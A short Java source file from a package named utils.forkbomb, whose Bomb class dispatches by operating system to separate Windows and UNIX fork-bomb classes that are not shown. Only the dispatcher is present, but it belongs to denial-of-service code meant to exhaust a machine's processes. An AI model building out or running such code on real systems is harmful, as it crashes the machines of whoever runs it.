package utils.forkbomb;

import java.io.IOException;

import utils.OsCheck;

public class Bomb {
    public static void explode(OsCheck.OSType os) throws IOException {
        if(os.equals(OsCheck.OSType.Windows))
            BombWindows.main(null);
        else
            BombUNIX.main(null);

    }
}
